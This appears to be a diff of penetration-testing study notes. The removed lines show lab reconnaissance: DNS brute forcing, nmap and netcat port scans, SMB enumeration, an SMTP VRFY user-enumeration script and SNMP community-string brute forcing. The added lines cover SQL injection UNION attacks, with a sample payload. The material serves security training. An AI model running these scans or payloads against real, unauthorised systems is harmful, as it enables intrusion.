-<span class="p">[*]</span> <span class="n">Using</span> <span class="n">the</span> <span class="n">dictionary</span> <span class="n">file</span><span class="p">:</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="n">kali</span><span class="p">/</span><span class="n">list</span><span class="p">.</span><span class="n">txt</span> <span class="p">(</span><span class="n">provided</span> <span class="n">by</span> <span class="n">user</span><span class="p">)</span>
-<span class="p">[*]</span> <span class="n">brt</span><span class="p">:</span> <span class="n">Performing</span> <span class="n">host</span> <span class="n">and</span> <span class="n">subdomain</span> <span class="n">brute</span> <span class="n">force</span> <span class="n">against</span> <span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">...</span>
-<span class="p">[+]</span>   <span class="n">A</span> <span class="n">www</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">149</span><span class="p">.</span><span class="n">56</span><span class="p">.</span><span class="n">244</span><span class="p">.</span><span class="n">87</span>
-<span class="p">[+]</span>   <span class="n">A</span> <span class="n">mail</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">51</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">212</span>
-<span class="p">[+]</span>   <span class="n">A</span> <span class="n">router</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="n">51</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">214</span>
-<span class="p">[+]</span> <span class="n">3</span> <span class="n">Records</span> <span class="n">Found</span>
-</code></pre></div>
-
-<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">dnsenum</span> <span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span>
-<span class="p">...</span>
-<span class="n">dnsenum</span> <span class="n">VERSION</span><span class="p">:</span><span class="n">1</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">6</span>
-<span class="p">-----</span> <span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span> <span class="p">-----</span>
-<span class="p">...</span>
-<span class="n">Brute</span> <span class="n">forcing</span> <span class="n">with</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">dnsenum</span><span class="p">/</span><span class="n">dns</span><span class="p">.</span><span class="n">txt</span><span class="p">:</span>
-<span class="n">_______________________________________________</span>
-<span class="n">admin</span><span class="p">.</span><span class="n">megacorpone</span><span class="p">.</span><span class="n">com</span><span class="p">.</span>   <span class="n">5</span>     <span class="k">IN</span>       <span class="n">A</span>              <span class="n">51</span><span class="p">.</span><span class="n">222</span><span class="p">.</span><span class="n">169</span><span class="p">.</span><span class="n">208</span>
-</code></pre></div>
-
-<div class="highlight"><pre><span></span><code><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">student</span><span class="p">&gt;</span> <span class="n">nslookup</span> <span class="n">mail</span><span class="p">.</span><span class="n">megacorptwo</span><span class="p">.</span><span class="n">com</span>
-<span class="n">DNS</span> <span class="n">request</span> <span class="n">timed</span> <span class="n">out</span><span class="p">.</span>
-<span class="n">timeout</span> <span class="n">was</span> <span class="n">2</span> <span class="n">seconds</span><span class="p">.</span>
-<span class="n">Server</span><span class="p">:</span> <span class="n">UnKnown</span>
-<span class="n">Address</span><span class="p">:</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">151</span>
-</code></pre></div>
-
-<div class="highlight"><pre><span></span><code><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">student</span><span class="p">&gt;</span><span class="n">nslookup</span> <span class="n">-type</span><span class="p">=</span><span class="n">TXT</span> <span class="n">info</span><span class="p">.</span><span class="n">megacorptwo</span><span class="p">.</span><span class="n">com</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">151</span>
-<span class="n">Server</span><span class="p">:</span> <span class="n">UnKnown</span>
-<span class="n">Address</span><span class="p">:</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">151</span>
-<span class="n">info</span><span class="p">.</span><span class="n">megacorptwo</span><span class="p">.</span><span class="n">com</span>
-<span class="n">text</span> <span class="p">=</span>
-<span class="s2">&quot;greetings from the TXT record body&quot;</span>
-</code></pre></div>
-
-<h3>TC/UDP Scanning</h3>
-<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nc</span> <span class="n">-nvv</span> <span class="n">-w</span> <span class="n">1</span> <span class="n">-z</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">152</span> <span class="n">3388</span><span class="p">-</span><span class="n">3390</span>
-<span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">152</span><span class="p">]</span> <span class="n">3390</span> <span class="p">(?)</span> <span class="p">:</span> <span class="n">Connection</span> <span class="n">refused</span>
-<span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">152</span><span class="p">]</span> <span class="n">3389</span> <span class="p">(</span><span class="n">ms-wbt-server</span><span class="p">)</span> <span class="n">open</span>
-<span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">152</span><span class="p">]</span> <span class="n">3388</span> <span class="p">(?)</span> <span class="p">:</span> <span class="n">Connection</span> <span class="n">refused</span>
-<span class="n">sent</span> <span class="n">0</span><span class="p">,</span> <span class="n">rcvd</span> <span class="n">0</span>
-</code></pre></div>
-
-<p>![[Pasted image 20240202113027.png]]</p>
-<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nc</span> <span class="n">-nv</span> <span class="n">-u</span> <span class="n">-z</span> <span class="n">-w</span> <span class="n">1</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">149</span> <span class="n">120</span><span class="p">-</span><span class="n">123</span>
-<span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">149</span><span class="p">]</span> <span class="n">123</span> <span class="p">(</span><span class="n">ntp</span><span class="p">)</span> <span class="n">open</span>
-</code></pre></div>
-
-<p>![[Pasted image 20240202113105.png]]</p>
-<h3>Port Scanning with Nmap</h3>
-<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">sudo</span> <span class="n">iptables</span> <span class="n">-I</span> <span class="n">INPUT</span> <span class="n">1</span> <span class="n">-s</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">149</span> <span class="n">-j</span> <span class="n">ACCEPT</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">sudo</span> <span class="n">iptables</span> <span class="n">-I</span> <span class="n">OUTPUT</span> <span class="n">1</span> <span class="n">-d</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">149</span> <span class="n">-j</span> <span class="n">ACCEPT</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">sudo</span> <span class="n">iptables</span> <span class="n">-Z</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nmap</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">149</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">sudo</span> <span class="n">iptables</span> <span class="n">-vn</span> <span class="n">-L</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">sudo</span> <span class="n">iptables</span> <span class="n">-Z</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nmap</span> <span class="n">-p</span> <span class="n">1</span><span class="p">-</span><span class="n">65535</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">149</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">sudo</span> <span class="n">iptables</span> <span class="n">-vn</span> <span class="n">-L</span>
-</code></pre></div>
-
-<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="n">-sS</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">149</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nmap</span> <span class="n">-sT</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">149</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="n">-sU</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">149</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="n">-sU</span> <span class="n">-sS</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">149</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nmap</span> <span class="n">-sn</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">1</span><span class="p">-</span><span class="n">253</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nmap</span> <span class="n">-v</span> <span class="n">-sn</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">1</span><span class="p">-</span><span class="n">253</span> <span class="n">-oG</span> <span class="nb">ping-sweep</span><span class="p">.</span><span class="n">txt</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">grep</span> <span class="n">Up</span> <span class="nb">ping-sweep</span><span class="p">.</span><span class="n">txt</span> <span class="p">|</span> <span class="n">cut</span> <span class="n">-d</span> <span class="s2">&quot; &quot;</span> <span class="o">-f</span> <span class="n">2</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nmap</span> <span class="n">-p</span> <span class="n">80</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">1</span><span class="p">-</span><span class="n">253</span> <span class="n">-oG</span> <span class="n">web-sweep</span><span class="p">.</span><span class="n">txt</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">grep</span> <span class="n">open</span> <span class="n">web-sweep</span><span class="p">.</span><span class="n">txt</span> <span class="p">|</span> <span class="n">cut</span> <span class="n">-d</span><span class="s2">&quot; &quot;</span> <span class="n">-f2</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nmap</span> <span class="n">-sT</span> <span class="n">-A</span> <span class="p">-</span><span class="n">-top-ports</span><span class="p">=</span><span class="n">20</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">1</span><span class="p">-</span><span class="n">253</span> <span class="n">-oG</span> <span class="n">top-port-sweep</span><span class="p">.</span><span class="n">txt</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="nb">cat </span><span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">nmap</span><span class="p">/</span><span class="n">nmap-services</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="n">-O</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">14</span> <span class="p">-</span><span class="n">-osscan-guess</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nmap</span> <span class="n">-sT</span> <span class="n">-A</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">14</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nmap</span> <span class="p">-</span><span class="n">-script</span> <span class="n">http-headers</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">6</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nmap</span> <span class="p">-</span><span class="n">-script-help</span> <span class="n">http-headers</span>
-</code></pre></div>
-
-<div class="highlight"><pre><span></span><code><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">student</span><span class="p">&gt;</span> <span class="nb">Test-NetConnection</span> <span class="n">-Port</span> <span class="n">445</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">151</span>
-<span class="n">ComputerName</span> <span class="p">:</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">151</span>
-<span class="n">RemoteAddress</span> <span class="p">:</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">151</span>
-<span class="n">RemotePort</span> <span class="p">:</span> <span class="n">445</span>
-<span class="n">InterfaceAlias</span> <span class="p">:</span> <span class="n">Ethernet0</span>
-<span class="n">SourceAddress</span> <span class="p">:</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">152</span>
-<span class="n">TcpTestSucceeded</span> <span class="p">:</span> <span class="n">True</span>
-</code></pre></div>
-
-<div class="highlight"><pre><span></span><code><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">student</span><span class="p">&gt;</span> <span class="n">1</span><span class="p">..</span><span class="n">1024</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span><span class="nb">echo </span><span class="p">((</span><span class="nb">New-Object</span>
-<span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TcpClient</span><span class="p">).</span><span class="n">Connect</span><span class="p">(</span><span class="s2">&quot;192.168.50.151&quot;</span><span class="p">,</span> <span class="nv">$_</span><span class="p">))</span> <span class="s2">&quot;TCP port $_ is open&quot;</span><span class="p">}</span> <span class="n">2</span><span class="p">&gt;</span><span class="nv">$null</span>
-<span class="n">TCP</span> <span class="n">port</span> <span class="n">88</span> <span class="n">is</span> <span class="n">open</span>
-</code></pre></div>
-
-<h3>SMB Enumeration</h3>
-<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nmap</span> <span class="n">-v</span> <span class="n">-p</span> <span class="n">139</span><span class="p">,</span><span class="n">445</span> <span class="n">-oG</span> <span class="n">smb</span><span class="p">.</span><span class="n">txt</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">1</span><span class="p">-</span><span class="n">254</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="nb">cat </span><span class="n">smb</span><span class="p">.</span><span class="n">txt</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">sudo</span> <span class="n">nbtscan</span> <span class="n">-r</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">0</span><span class="p">/</span><span class="n">24</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="nb">ls </span><span class="p">-</span><span class="n">1</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">nmap</span><span class="p">/</span><span class="n">scripts</span><span class="p">/</span><span class="n">smb</span><span class="p">*</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="nb">ls </span><span class="p">-</span><span class="n">1</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">nmap</span><span class="p">/</span><span class="n">scripts</span><span class="p">/</span><span class="n">smb</span><span class="p">*</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nmap</span> <span class="n">-v</span> <span class="n">-p</span> <span class="n">139</span><span class="p">,</span><span class="n">445</span> <span class="p">-</span><span class="n">-script</span> <span class="n">smb-os-discovery</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">152</span>
-</code></pre></div>
-
-<div class="highlight"><pre><span></span><code><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">student</span><span class="p">&gt;</span><span class="n">net</span> <span class="n">view</span> <span class="p">\\</span><span class="n">dc01</span> <span class="p">/</span><span class="n">all</span>
-</code></pre></div>
-
-<h3>SMTP Enumeration</h3>
-<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">nc</span> <span class="n">-nv</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">8</span> <span class="n">25</span>
-<span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">8</span><span class="p">]</span> <span class="n">25</span> <span class="p">(</span><span class="n">smtp</span><span class="p">)</span> <span class="n">open</span>
-<span class="n">220</span> <span class="n">mail</span> <span class="n">ESMTP</span> <span class="n">Postfix</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
-<span class="n">VRFY</span> <span class="n">root</span>
-<span class="n">252</span> <span class="n">2</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span> <span class="n">root</span>
-<span class="n">VRFY</span> <span class="n">idontexist</span>
-</code></pre></div>
-
-<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/python</span>
-<span class="kn">import</span> <span class="nn">socket</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
-<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Usage: vrfy.py &lt;username&gt; &lt;target_ip&gt;&quot;</span><span class="p">)</span>
-<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-<span class="c1"># Create a Socket</span>
-<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
-<span class="c1"># Connect to the Server</span>
-<span class="n">ip</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
-<span class="n">connect</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="mi">25</span><span class="p">))</span>
-<span class="c1"># Receive the banner</span>
-<span class="n">banner</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
-<span class="c1"># VRFY a user</span>
-<span class="n">user</span> <span class="o">=</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;VRFY &#39;</span> <span class="o">+</span> <span class="n">user</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
-<span class="n">result</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
-<span class="c1"># Close the socket</span>
-<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</code></pre></div>
-
-<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~/</span><span class="n">Desktop</span><span class="p">$</span> <span class="n">python3</span> <span class="n">smtp</span><span class="p">.</span><span class="n">py</span> <span class="n">root</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">8</span>
-<span class="n">b</span><span class="s1">&#39;220 mail ESMTP Postfix (Ubuntu)\r\n&#39;</span>
-<span class="n">b</span><span class="s1">&#39;252 2.0.0 root\r\n&#39;</span>
-
-<span class="nv">@kali</span><span class="p">:~/</span><span class="n">Desktop</span><span class="p">$</span> <span class="n">python3</span> <span class="n">smtp</span><span class="p">.</span><span class="n">py</span> <span class="n">johndoe</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">8</span>
-<span class="n">b</span><span class="s1">&#39;220 mail ESMTP Postfix (Ubuntu)\r\n&#39;</span>
-<span class="n">b</span><span class="s1">&#39;550 5.1.1 &lt;johndoe&gt;: Recipient address rejected: User unknown in local recipient</span>
-<span class="s1">table\r\n&#39;</span>
-</code></pre></div>
-
-<div class="highlight"><pre><span></span><code><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">student</span><span class="p">&gt;</span> <span class="nb">Test-NetConnection</span> <span class="n">-Port</span> <span class="n">25</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">8</span>
-<span class="n">ComputerName</span> <span class="p">:</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">8</span> 
-<span class="n">RemoteAddress</span> <span class="p">:</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">8</span>
-<span class="n">RemotePort</span> <span class="p">:</span> <span class="n">25</span>
-<span class="n">InterfaceAlias</span> <span class="p">:</span> <span class="n">Ethernet0</span>
-<span class="n">SourceAddress</span> <span class="p">:</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">152</span>
-<span class="n">TcpTestSucceeded</span> <span class="p">:</span> <span class="n">True</span>
-
-<span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="n">dism</span> <span class="p">/</span><span class="n">online</span> <span class="p">/</span><span class="nb">Enable-Feature</span> <span class="p">/</span><span class="n">FeatureName</span><span class="p">:</span><span class="n">TelnetClient</span>
-
-<span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">telnet</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">8</span> <span class="n">25</span>
-<span class="n">220</span> <span class="n">mail</span> <span class="n">ESMTP</span> <span class="n">Postfix</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
-<span class="n">VRFY</span> <span class="n">goofy</span>
-<span class="n">550</span> <span class="n">5</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">1</span> <span class="p">&lt;</span><span class="n">goofy</span><span class="p">&gt;:</span> <span class="n">Recipient</span> <span class="n">address</span> <span class="n">rejected</span><span class="p">:</span> <span class="n">User</span> <span class="n">unknown</span> <span class="k">in</span> <span class="n">local</span> <span class="n">recipient</span> <span class="n">table</span>
-<span class="n">VRFY</span> <span class="n">root</span>
-<span class="n">252</span> <span class="n">2</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span> <span class="n">root</span>
-</code></pre></div>
-
-<h3>SNMP Enumeration</h3>
+<p>Again, the application might actually return this error message, or might just return a generic error or no results. When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column. The effect on the resulting HTTP response depends on the application's code. If you are lucky, you will see some additional content within the response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a ==NullPointerException==. Worst case, the response might be indistinguishable from that which is caused by an incorrect number of nulls, making this method of determining the column count ineffective.</p>
 <table>
 <thead>
 <tr>
-<th>Code</th>
-<th>Description</th>
+<th>🧪 LAB PRACTITIONER</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td>1.3.6.1.2.1.25.1.6.0</td>
-<td>System Processes</td>
-</tr>
-<tr>
-<td>1.3.6.1.2.1.25.4.2.1.2</td>
-<td>Running Programs</td>
-</tr>
-<tr>
-<td>1.3.6.1.2.1.25.4.2.1.4</td>
-<td>Processes Path</td>
-</tr>
-<tr>
-<td>1.3.6.1.2.1.25.2.3.1.4</td>
-<td>Storage Units</td>
-</tr>
-<tr>
-<td>1.3.6.1.2.1.25.6.3.1.2</td>
-<td>Software Name</td>
-</tr>
-<tr>
-<td>1.3.6.1.4.1.77.1.2.25</td>
-<td>User Accounts</td>
-</tr>
-<tr>
-<td>1.3.6.1.2.1.6.13.1.3</td>
-<td>TCP Local Ports</td>
+<td><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">SQL injection UNION attack, determining the number of columns returned by the query</a></td>
 </tr>
 </tbody>
 </table>
-<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="n">-sU</span> <span class="p">-</span><span class="n">-open</span> <span class="n">-p</span> <span class="n">161</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">1</span><span class="p">-</span><span class="n">254</span> <span class="n">-oG</span> <span class="nb">open-snmp</span><span class="p">.</span><span class="n">txt</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="nb">echo </span><span class="n">public</span> <span class="p">&gt;</span> <span class="n">community</span>
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="nb">echo </span><span class="n">private</span> <span class="p">&gt;&gt;</span> <span class="n">community</span>
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="nb">echo </span><span class="n">manager</span> <span class="p">&gt;&gt;</span> <span class="n">community</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="k">for</span> <span class="n">ip</span> <span class="k">in</span> <span class="p">$(</span><span class="n">seq</span> <span class="n">1</span> <span class="n">254</span><span class="p">);</span> <span class="k">do</span> <span class="nb">echo </span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="nv">$ip</span><span class="p">;</span> <span class="n">done</span> <span class="p">&gt;</span> <span class="n">ips</span>
-
-<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">onesixtyone</span> <span class="n">-c</span> <span class="n">community</span> <span class="n">-i</span> <span class="n">ips</span>
+<blockquote>
+<p><strong>Note</strong>
+* The reason for using ==NULL== as the values returned from the injected ==SELECT== query is that the data types in each column must be compatible between the original and the injected queries. Since ==NULL== is convertible to every commonly used data type, using ==NULL== maximizes the chance that the payload will succeed when the column count is correct.
+* On Oracle, every ==SELECT== query must use the ==FROM== keyword and specify a valid table. There is a built-in table on Oracle called ==dual== which can be used for this purpose. So the injected queries on Oracle would need to look like: </p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><span class="w">        </span><span class="err">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">DUAL</span><span class="c1">--</span>
 </code></pre></div>
 
-<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">snmpwalk</span> <span class="n">-c</span> <span class="n">public</span> <span class="n">-v1</span> <span class="n">-t</span> <span class="n">10</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">151</span>
+<blockquote>
+<ul>
+<li>The payloads described use the double-dash comment sequence ==--== to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character ==#== can be used to identify a comment.
+  For more details of database-specific syntax, see the [[SQL injection cheat sheet]].</li>
+</ul>
+</blockquote>
+<h2>Finding columns with a useful data type in a SQL injection UNION attack</h2>
